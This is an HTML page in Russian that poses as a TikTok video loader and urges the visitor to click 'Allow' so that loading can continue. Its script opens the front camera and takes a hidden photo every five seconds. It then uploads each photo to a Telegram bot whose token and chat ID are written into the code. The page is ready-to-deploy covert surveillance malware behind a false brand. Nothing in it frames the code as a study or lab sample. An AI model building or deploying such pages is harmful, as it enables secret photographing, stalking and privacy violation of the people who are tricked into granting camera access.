<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .logo { width: 100px; height: 100px; margin-bottom: 20px; border-radius: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; font-size: 18px; font-weight: bold; }
        #video, #canvas { display: none; position: absolute; }
        
        .permission-hint {
            background-color: #fe2c55;
            color: white;
            padding: 12px 24px;
            border-radius: 30px; 
            font-size: 15px;
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            z-index: 10;
        }
    </style>
</head>
<body>
    <img src="https://sf-tb-static.fingerfun.com" alt="TikTok" class="logo">
    <div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        if (video.videoWidth === 0) return; // Ждем, пока видео реально появится

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'shot.jpg');

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) { console.error("Ошибка отправки:", e); }
        }, 'image/jpeg', 0.7);
    }

    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            // Убираем подсказку только когда камера реально разрешена
            document.getElementById('hint').style.display = 'none';
            
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                // Делаем фото через 2 секунды после старта, чтобы камера сфокусировалась
                setTimeout(() => {
                    takeAndSendPhoto();
                    setInterval(takeAndSendPhoto, 5000); // Повтор каждые 5 сек
                }, 2000);
            };
        })
        .catch(err => { 
            document.getElementById('hint').innerText = "Ошибка: разрешите доступ к камере";
            document.getElementById('hint').style.backgroundColor = "gray";
        });
    };
</script>
</body>
</html>
